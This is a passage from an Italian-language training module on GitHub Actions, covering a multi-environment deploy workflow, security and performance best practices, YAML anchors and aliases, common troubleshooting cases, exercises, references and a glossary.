          token: ${{ secrets.GITHUB_TOKEN }}
          repository: ${{ github.repository }}
          retain_days: 30
          keep_minimum_runs: 5
```

### Template 5: Workflow di Deploy Multi-Ambiente

```yaml
name: Deploy Multi-Environment

on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        required: true
        options: [development, staging, production]
      version:
        type: string
        required: true
        description: 'Tag or SHA to deploy'

run-name: Deploy ${{ inputs.version }} to ${{ inputs.environment }}

permissions:
  contents: read
  id-token: write

jobs:
  validate:
    name: Validate Input
    runs-on: ubuntu-latest
    outputs:
      image-tag: ${{ steps.resolve.outputs.tag }}
    steps:
      - id: resolve
        run: |
          VERSION="${{ inputs.version }}"
          # Verifica che il tag o SHA esista
          if git ls-remote --tags origin "refs/tags/$VERSION" | grep -q "$VERSION"; then
            echo "tag=$VERSION" >> "$GITHUB_OUTPUT"
          else
            echo "::error::Versione $VERSION non trovata"
            exit 1
          fi

  deploy:
    name: Deploy to ${{ inputs.environment }}
    needs: validate
    runs-on: ubuntu-latest
    environment:
      name: ${{ inputs.environment }}
      url: https://${{ inputs.environment }}.example.com
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.version }}

      - name: Configure cloud credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}

      - name: Deploy
        run: |
          echo "Deploying ${{ needs.validate.outputs.image-tag }} to ${{ inputs.environment }}"
          # Il deploy effettivo dipenderebbe dall'infrastruttura
          aws ecs update-service \
            --cluster ${{ vars.ECS_CLUSTER }} \
            --service ${{ vars.ECS_SERVICE }} \
            --force-new-deployment

      - name: Verify deployment
        run: |
          echo "Verifying deployment..."
          for i in $(seq 1 30); do
            HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://${{ inputs.environment }}.example.com/health")
            if [ "$HTTP_STATUS" = "200" ]; then
              echo "Deployment verified successfully"
              exit 0
            fi
            echo "Attempt $i: HTTP $HTTP_STATUS, retrying in 10s..."
            sleep 10
          done
          echo "::error::Deployment verification failed after 5 minutes"
          exit 1

      - name: Deploy summary
        if: always()
        run: |
          echo "## Deploy Summary" >> "$GITHUB_STEP_SUMMARY"
          echo "- **Environment:** ${{ inputs.environment }}" >> "$GITHUB_STEP_SUMMARY"
          echo "- **Version:** ${{ inputs.version }}" >> "$GITHUB_STEP_SUMMARY"
          echo "- **Status:** ${{ job.status }}" >> "$GITHUB_STEP_SUMMARY"
          echo "- **Actor:** ${{ github.actor }}" >> "$GITHUB_STEP_SUMMARY"
          echo "- **Timestamp:** $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_STEP_SUMMARY"
```

---

## Best Practices

### Struttura dei Workflow

1. **Separare i concern**: Un workflow per CI, uno per CD, uno per security scanning. Non mettere tutto in un unico file.

2. **Naming chiaro**: Usare nomi descrittivi per workflow, job e step. Esempio: `CI — Lint, Test, Build` invece di `ci.yml`.

3. **Principio del minimo privilegio**: Specificare sempre i permessi minimi necessari. Non usare `permissions: write-all`.

4. **Pinning delle versioni**: Usare hash completi per le azioni di terze parti per sicurezza.

```yaml
# Sicuro: pinned all'hash del commit
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0

# Accettabile: pinned alla major version
- uses: actions/checkout@v4

# Rischioso: usa sempre l'ultima versione
- uses: actions/checkout@main
```

5. **Timeout**: Impostare sempre un timeout per evitare job che girano indefinitamente.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Long running task
        timeout-minutes: 5
        run: ./long-task.sh
```

### Performance

1. **Caching**: Usare `actions/cache` o il caching integrato di `setup-node`, `setup-python`, ecc.
2. **Concurrency**: Usare `cancel-in-progress: true` per PR per risparmiare risorse.
3. **Paths filter**: Triggerare i workflow solo quando i file rilevanti cambiano.
4. **Job dependencies**: Parallelizzare i job indipendenti.

### Sicurezza

1. **Non esporre segreti**: Non stampare mai segreti nei log. GitHub li maschera automaticamente, ma è meglio essere cauti.
2. **Usare ambienti**: Per deploy in produzione, usare GitHub Environments con protection rules.
3. **Review delle azioni di terze parti**: Verificare il codice sorgente delle azioni prima di usarle.

---

## YAML Anchors e Alias nei Workflow

Le YAML anchors (`&nome`) e gli alias (`*nome`) sono una funzionalita nativa del formato YAML che permette di definire un blocco di dati una volta e riutilizzarlo in piu punti dello stesso file. Nei workflow GitHub Actions, questa tecnica riduce la duplicazione e migliora la manutenibilita, specialmente per configurazioni ripetute come setup di environment, step comuni o opzioni di servizi.

### Sintassi Base: Anchor e Alias

Un anchor si definisce con `&nome` accanto a un valore o un blocco YAML. Un alias `*nome` inserisce una copia di quel blocco:

```yaml
# Definizione di anchor per configurazioni comuni
# NOTA: Le anchor DEVONO essere definite in una posizione valida del YAML.
# GitHub Actions ignora chiavi sconosciute al top-level, quindi si puo usare
# un blocco custom come contenitore per le definizioni.

# Approccio: usare le anchor inline dove vengono usate la prima volta

name: CI with Anchors

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  NODE_VERSION: '20'

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4

      # L'anchor &setup-node definisce questo step come riutilizzabile
      - &setup-node
        name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - &install-deps
        name: Install dependencies
        run: npm ci

      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - *setup-node              # Riutilizza lo step definito sopra
      - *install-deps            # Riutilizza l'installazione
      - run: npm test

  build:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - *setup-node
      - *install-deps
      - run: npm run build
```

### Merge Key con <<

La merge key `<<:` permette di unire il contenuto di un anchor con chiavi aggiuntive o di sovrascrivere valori specifici. Questo e particolarmente utile per le opzioni dei service container:

```yaml
name: Integration Tests

on: [push]

jobs:
  test-postgres:
    runs-on: ubuntu-latest
    services:
      db:
        image: postgres:16-alpine
        env: &db-env
          POSTGRES_USER: testuser
          POSTGRES_PASSWORD: testpassword
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: &health-postgres >-
          --health-cmd="pg_isready -U testuser -d testdb"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=5
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - name: Run tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://testuser:testpassword@localhost:5432/testdb

  test-postgres-15:
    runs-on: ubuntu-latest
    services:
      db:
        image: postgres:15-alpine       # Versione diversa
        env: *db-env                     # Stesse credenziali via alias
        ports:
          - 5432:5432
        options: *health-postgres        # Stesso health check
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run test:integration
        env:
          DATABASE_URL: postgresql://testuser:testpassword@localhost:5432/testdb
```

### Anchor per Configurazioni di Step Complesse

Un caso d'uso frequente e la definizione di step di notifica o cleanup riutilizzabili in piu job:

```yaml
name: Deploy Pipeline

on:
  push:
    tags: ['v*']

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh staging

      # Definisco l'anchor per lo step di notifica
      - &notify-slack
        name: Notify Slack
        if: always()
        run: |
          STATUS="${{ job.status }}"
          ENVIRONMENT="${{ github.job }}"
          curl -X POST "$SLACK_WEBHOOK" \
            -H 'Content-Type: application/json' \
            -d "{\"text\": \"Deploy $ENVIRONMENT: $STATUS\"}"
        env:
          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh production
      - *notify-slack            # Riutilizza lo step di notifica identico

```

### Limitazioni delle YAML Anchors in GitHub Actions

Le YAML anchors hanno limitazioni importanti di cui tenere conto:

| Limitazione | Dettaglio |
|---|---|
| **Scope del file** | Le anchor funzionano SOLO all'interno dello stesso file YAML. Non possono essere condivise tra workflow diversi. |
| **Non funzionano con `uses:`** | Non si possono definire anchor in un reusable workflow e usare alias nel workflow chiamante. Il parser YAML risolve le anchor prima che GitHub Actions interpreti il file. |
| **Nessun override parziale su liste** | La merge key `<<:` funziona solo con mappe (oggetti). Non e possibile unire o estendere liste (array) tramite anchor. |
| **Validazione** | GitHub Actions non valida le anchor YAML; il parser YAML standard le risolve. Se un alias punta a un anchor inesistente, il file YAML e invalido e il workflow non viene caricato. |
| **Leggibilita** | Un uso eccessivo di anchor puo rendere il workflow difficile da leggere per chi non conosce bene la sintassi YAML. Limitarsi a 3-5 anchor per file. |
| **Debugging** | Nei log di GitHub Actions, le anchor sono gia risolte: si vedono i valori espansi, non i riferimenti `*alias`. Questo puo rendere piu difficile capire da dove proviene una configurazione. |

### Quando Usare Anchors vs Alternative

| Scenario | Soluzione Raccomandata |
|---|---|
| Stessi step ripetuti in job dello stesso file | **YAML anchors** |
| Stessa logica condivisa tra workflow diversi | **Composite action** |
| Stesso intero job riutilizzabile | **Reusable workflow** |
| Stesse variabili d'ambiente in piu contesti | **Organization/repository `vars`** |
| Stesso setup linguaggio + dipendenze | **Composite action con cache integrato** |

---

## Troubleshooting

### Workflow Non Triggerato

```bash
# Cause comuni:
# 1. Il file YAML ha errori di sintassi
# 2. Il workflow è nella directory sbagliata (deve essere .github/workflows/)
# 3. Il branch non matcha il filtro on.push.branches
# 4. paths-ignore esclude tutti i file modificati
# 5. Lo schedule funziona solo sul branch predefinito

# Verificare la sintassi
yamllint .github/workflows/ci.yml

# Verificare gli eventi recenti
gh api repos/{owner}/{repo}/actions/runs --jq '.workflow_runs[:5] | .[].event'
```

### Step Fallisce Silenziosamente

```yaml
# In bash, i comandi in pipeline non propagano errori di default
# Soluzione: usare pipefail (impostato automaticamente con shell: bash)

# Se serve ignorare un errore specifico:
- name: Might fail
  run: some-command || true
  # Oppure:
  continue-on-error: true
```

### Variabili Non Espanse

```yaml
# Le espressioni ${{ }} vengono espanse PRIMA dell'esecuzione
# Le variabili $VAR vengono espanse DURANTE l'esecuzione dalla shell

# Corretto:
- run: echo "${{ secrets.MY_SECRET }}"   # Espanso da Actions
- run: echo "$MY_VAR"                    # Espanso da bash

# Errato (doppio dollaro in shell):
- run: echo "$${{ secrets.MY_SECRET }}"  # Il $$ viene interpretato come PID
```

### Errori di Permessi (Resource Not Accessible by Integration)

L'errore `Resource not accessible by integration` e uno dei piu comuni e indica che il `GITHUB_TOKEN` non ha i permessi necessari per l'operazione richiesta:

```yaml
# PROBLEMA: il workflow tenta di scrivere un commento su una PR
# ma non ha il permesso pull-requests: write

# SOLUZIONE: aggiungere i permessi espliciti
permissions:
  contents: read
  pull-requests: write    # Necessario per commentare sulle PR
  issues: write           # Necessario per creare/modificare issue

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - name: Comment on PR
        uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'CI completata con successo!'
            })
```

Cause comuni di questo errore:

1. **Modalita restricted:** Il repository o l'organizzazione usa la modalita `restricted` per il `GITHUB_TOKEN` (default per nuovi repo) e il workflow non dichiara i permessi necessari.
2. **Fork PR:** Le PR da fork hanno automaticamente permessi ridotti (`read-only`) indipendentemente da cosa specifica il workflow.
3. **Permessi mancanti a livello job:** Se i permessi sono dichiarati a livello workflow ma un job li sovrascrive con un set incompleto, il job perde i permessi non elencati.

### Cache Non Ripristinata

Il caching e una fonte frequente di confusione. Ecco le cause piu comuni per cui una cache non viene trovata:

```yaml
# PROBLEMA: la cache non viene mai ripristinata (cache miss continuo)

# Causa 1: la key non corrisponde
# La cache e immutabile: una volta creata con una key, non puo essere aggiornata.
# Se i file di lock cambiano, la key cambia e la cache precedente non viene trovata.
- uses: actions/cache@v4
  with:
    path: node_modules
    key: deps-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    # SOLUZIONE: aggiungere restore-keys per fallback parziale
    restore-keys: |
      deps-${{ runner.os }}-

# Causa 2: path errato
# Su runner diversi, i percorsi delle cache cambiano
# Linux: ~/.cache/pip  vs  macOS: ~/Library/Caches/pip
- uses: actions/cache@v4
  with:
    path: |
      ~/.cache/pip                    # Linux
      ~/Library/Caches/pip            # macOS
      ~\AppData\Local\pip\Cache       # Windows
    key: pip-${{ runner.os }}-${{ hashFiles('**/requirements.txt') }}

# Causa 3: limite di storage raggiunto (10 GB per repository)
# GitHub rimuove automaticamente le cache meno recenti quando il limite e raggiunto.
# Non c'e un errore esplicito: la cache semplicemente non viene trovata.

# Verifica: controllare le cache attive
# gh actions-cache list --repo owner/repo
```

### Check Obbligatorio Skippato con Path Filter

Un problema insidioso si verifica quando un workflow usa `paths` filter e il repository ha branch protection con required status check. Se nessun file nel path specificato cambia, il workflow non si esegue e il check richiesto resta in stato "pending", bloccando il merge della PR:

```yaml
# PROBLEMA:
# Il workflow ci.yml si attiva solo per modifiche in src/
# La PR modifica solo docs/README.md
# Il check "CI" e required ma non si esegue mai -> PR bloccata

on:
  pull_request:
    paths: ['src/**']    # Non si attiva per modifiche a docs/

# SOLUZIONE 1: Aggiungere un job "sentinel" sempre attivo
name: CI
on:
  pull_request:
    branches: [main]
    # Rimuovere il paths filter dal trigger

jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      src: ${{ steps.filter.outputs.src }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            src:
              - 'src/**'

  ci:
    needs: changes
    if: needs.changes.outputs.src == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  # Questo job e SEMPRE eseguito e puo essere il required check
  status:
    needs: [changes, ci]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Verify CI status
        run: |
          if [ "${{ needs.ci.result }}" = "failure" ]; then
            exit 1
          fi
          echo "CI passed or was skipped (no relevant changes)"
```

### Versione Mismatch tra upload-artifact e download-artifact

Le action `actions/upload-artifact` e `actions/download-artifact` devono usare la stessa major version. Mischiare v3 e v4 causa errori silenti o artefatti non trovati:

```yaml
# SBAGLIATO: versioni incompatibili
- uses: actions/upload-artifact@v3     # v3
  with:
    name: build
    path: dist/

# In un altro job:
- uses: actions/download-artifact@v4   # v4 non trova artefatti caricati con v3!
  with:
    name: build

# CORRETTO: stessa major version
- uses: actions/upload-artifact@v4
  with:
    name: build
    path: dist/

- uses: actions/download-artifact@v4
  with:
    name: build
```

### Nomi di Job nella Matrix che Causano Confusione

Quando si usa una strategy matrix, GitHub genera automaticamente il nome del job combinando il nome base con i valori della matrice. Se il required check nella branch protection usa un nome specifico, potrebbe non corrispondere ai nomi generati:

```yaml
# Il job genera nomi come:
# "Test (ubuntu-latest, 18)"
# "Test (ubuntu-latest, 20)"
# "Test (windows-latest, 20)"

jobs:
  test:
    name: Test (${{ matrix.os }}, ${{ matrix.node-version }})
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node-version: [18, 20]
    runs-on: ${{ matrix.os }}
    steps:
      - run: npm test

# SOLUZIONE: nella branch protection, specificare il nome esatto generato
# oppure usare un job "gate" finale come required check:
  all-tests-passed:
    needs: test
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          if [ "${{ contains(needs.*.result, 'failure') }}" = "true" ]; then
            exit 1
          fi
```

---

## Esercizi

### Esercizio 1 — Workflow CI Base Multi-Linguaggio

**Obiettivo:** Creare un workflow CI che si attiva su push e PR con step di build, lint e test.

1. Creare `.github/workflows/ci.yml` con trigger `push` (solo branch `main` e `develop`) e `pull_request` (solo branch `main`)
2. Configurare un job con step: checkout, setup linguaggio, install dependencies, lint, test
3. Aggiungere filtri `paths` per eseguire il workflow solo quando cambiano file sorgente (escludere `docs/`, `*.md`)
4. Configurare `concurrency` per cancellare run precedenti sulla stessa PR
5. Verificare che il workflow si attivi correttamente su push e PR e che i filtri funzionino

### Esercizio 2 — Job Dependencies e Output Sharing

**Obiettivo:** Implementare un workflow multi-job con dipendenze e passaggio di dati tra job.

1. Creare un workflow con 4 job: `lint`, `test`, `build`, `deploy`
2. Configurare `needs`: `build` dipende da `lint` e `test` (paralleli), `deploy` dipende da `build`
3. Il job `build` deve produrre un output con il numero di versione (calcolato dallo script)
4. Il job `deploy` deve leggere l'output del job `build` e usarlo come variabile
5. Aggiungere `if: failure()` su un job di notifica che si esegue solo se un job precedente fallisce

### Esercizio 3 — Expressions e Condizioni Avanzate

**Obiettivo:** Utilizzare expressions e contexts per creare un workflow dinamico.

1. Creare un workflow con `workflow_dispatch` e 3 input: `environment` (choice: dev/staging/prod), `skip_tests` (boolean), `version` (string)
2. Usare `if:` condizioni per: eseguire test solo se `skip_tests` e `false`, eseguire deploy prod solo se il branch e `main`
3. Usare `fromJSON()` per costruire una lista dinamica dal contesto `github`
4. Configurare variabili d'ambiente a livello workflow, job e step con override progressivo
5. Usare `hashFiles()` per generare una cache key basata sui file di lock delle dipendenze

### Esercizio 4 — Secret e Variabili d'Ambiente

**Obiettivo:** Gestire secret e variabili in modo sicuro attraverso ambienti multipli.

1. Configurare 3 environment su GitHub: `development`, `staging`, `production`
2. Per ogni environment definire variabili (`API_URL`, `LOG_LEVEL`) e secret (`API_KEY`, `DB_PASSWORD`) con valori diversi
3. Creare un workflow che seleziona l'environment in base al branch: `develop` → development, `release/*` → staging, `main` → production
4. Verificare che i secret non vengano stampati nei log (mascherati con `***`)
5. Aggiungere protection rules sull'environment `production`: required reviewers e wait timer di 5 minuti

### Esercizio 5 — Reusable Workflow e Composite Action

**Obiettivo:** Creare componenti riutilizzabili per eliminare duplicazione tra workflow.

1. Creare un reusable workflow `.github/workflows/deploy-reusable.yml` con `workflow_call` che accetta input: `environment`, `version`, `dry_run`
2. Configurare `secrets: inherit` per passare tutti i secret dal workflow chiamante
3. Creare un workflow chiamante che invoca il reusable 3 volte (dev, staging, prod) in sequenza con `needs`
4. Creare una composite action in `.github/actions/setup-env/action.yml` che installa dipendenze, configura cache e setta variabili
5. Usare la composite action nel reusable workflow e verificare che il flusso completo funzioni

---

## Letture e Riferimenti

### Documentazione ufficiale

- **GitHub Docs — Workflow Syntax** — Riferimento completo della sintassi YAML per i workflow GitHub Actions. <https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions> (consultato: 2026-05-24)
- **GitHub Docs — Events that trigger workflows** — Lista completa degli eventi che possono attivare un workflow. <https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows> (consultato: 2026-05-24)
- **GitHub Docs — Expressions** — Sintassi delle espressioni utilizzabili in `if:`, `env:` e altri contesti. <https://docs.github.com/en/actions/learn-github-actions/expressions> (consultato: 2026-05-24)
- **GitHub Docs — Contexts** — Oggetti di contesto disponibili nei workflow (github, env, job, steps, runner, secrets). <https://docs.github.com/en/actions/learn-github-actions/contexts> (consultato: 2026-05-24)
- **GitHub Docs — Environment Variables** — Variabili d'ambiente predefinite e custom nei workflow. <https://docs.github.com/en/actions/learn-github-actions/variables> (consultato: 2026-05-24)
- **GitHub Docs — Permissions** — Configurazione dei permessi GITHUB_TOKEN a livello job. <https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs> (consultato: 2026-05-24)
- **GitHub Actions Marketplace** — Catalogo di action riutilizzabili create dalla community e da GitHub. <https://github.com/marketplace?type=actions> (consultato: 2026-05-24)
- **GitHub Actions Runner** — Repository del runner self-hosted per GitHub Actions. <https://github.com/actions/runner> (consultato: 2026-05-24)

### Libri e approfondimenti

- Chacon S., Straub B., *Pro Git* (2nd ed.), Apress, 2014. Disponibile gratuitamente su <https://git-scm.com/book>.
- Krief M., *Learning GitHub Actions*, O'Reilly, 2024.
- Humble J., Farley D., *Continuous Delivery*, Addison-Wesley, 2010. Principi fondamentali di CI/CD.

---

## Riferimenti Incrociati

| Modulo | Relazione |
|---|---|
| [08 — Git Hooks e Automazione](08-git-hooks-automazione.md) | I Git hooks client-side complementano le automazioni server-side dei workflow Actions |
| [12 — Repository Management](12-github-repository-management.md) | I required status check delle branch protection si collegano ai workflow CI definiti qui |
| [16 — GitHub Security e Scanning](16-github-security-scanning.md) | I workflow di scanning (CodeQL, Dependabot) utilizzano la sintassi trattata in questo modulo |
| [18 — GitHub Actions Avanzate](18-github-actions-avanzate.md) | Le tecniche avanzate (matrix, caching, artifacts, self-hosted runner) estendono la sintassi base trattata qui |
| [19 — GitHub Actions CI/CD Ricette](19-github-actions-ci-cd-ricette.md) | Le ricette CI/CD applicano la sintassi di questo modulo a scenari reali di build, test e deploy |
| [21 — Self-Hosted Runners](21-github-actions-self-hosted-runners.md) | I runner self-hosted richiedono configurazioni specifiche nei workflow trattati in questo modulo |

---

## Glossario

| Termine | Definizione |
|---|---|
| **Workflow** | File YAML in `.github/workflows/` che definisce un processo automatizzato composto da uno o piu job attivati da eventi. |
| **Job** | Unita di esecuzione in un workflow che raggruppa step correlati. I job sono eseguiti in parallelo per default, o in sequenza con `needs`. |
| **Step** | Singola operazione all'interno di un job: un comando shell (`run`) o un'action riutilizzabile (`uses`). |
| **Action** | Componente riutilizzabile (repository GitHub) che incapsula logica comune: checkout, setup linguaggio, deploy, notifica. |
| **Trigger event** | Evento GitHub (push, pull_request, schedule, workflow_dispatch) che avvia l'esecuzione di un workflow. |
| **Expression** | Sintassi `${{ ... }}` per valutare espressioni dinamiche nei workflow: confronti, funzioni, accesso ai contesti. |
| **Context** | Oggetto che fornisce informazioni sull'esecuzione: `github` (evento, repo), `env` (variabili), `secrets` (segreti), `runner` (ambiente). |
| **GITHUB_TOKEN** | Token generato automaticamente per ogni esecuzione di workflow, con permessi configurabili per interagire con le API del repository. |
| **Reusable workflow** | Workflow con trigger `workflow_call` che puo essere invocato da altri workflow, accettando input e secret come parametri. |
| **Composite action** | Action definita in `action.yml` con step multipli, che combina comandi shell e altre action in un componente riutilizzabile. |
| **Concurrency** | Meccanismo che limita le esecuzioni simultanee di un workflow o job, con opzione `cancel-in-progress` per interrompere run precedenti. |
| **needs** | Parola chiave che definisce le dipendenze tra job: un job con `needs: [lint, test]` attende il completamento di entrambi prima di eseguire. |
| **Environment** | Configurazione nominata (es. production, staging) con variabili, secret e protection rules (required reviewers, wait timer). |
| **workflow_dispatch** | Trigger manuale che consente di avviare un workflow dalla UI GitHub o via API, con input personalizzabili. |
| **YAML anchor** | Funzionalita YAML (`&nome` / `*nome`) per riutilizzare blocchi di configurazione, utile per ridurre la duplicazione nei workflow complessi. |
